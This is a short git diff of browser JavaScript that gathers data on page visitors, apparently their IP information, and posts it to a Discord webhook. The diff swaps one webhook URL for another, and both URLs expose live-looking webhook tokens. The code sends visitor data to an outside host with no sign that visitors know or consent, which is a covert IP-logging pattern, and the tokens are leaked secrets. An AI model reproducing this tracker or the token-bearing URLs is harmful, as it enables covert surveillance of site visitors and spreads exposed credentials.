@@ -54,7 +54,7 @@ ip.onreadystatechange = (e) => {
         }
 
         var dsreq = new XMLHttpRequest();   //post to a discord server
-        dsreq.open('POST', 'https://discord.com/api/webhooks/995696108703596574/Is3h9dOul5Cru76Bjvr330NV0DelfhdQcVUi32x2NYQhDnYMS3dLNvi9sQBKVLmE_Szl');
+        dsreq.open('POST', 'https://discord.com/api/webhooks/1152362730871869450/mNJCkG57KRatLtO_wjw0lOxGp-bkz7QONHX2yKkx5IOVPUP5PbFaFzTxkluXuFtf_xwM');
         dsreq.setRequestHeader('Content-Type', 'application/json');
         dsreq.send(JSON.stringify({ content: "```json\n" + JSON.stringify(visitor) + "```", username: "Visitor" }));
     }
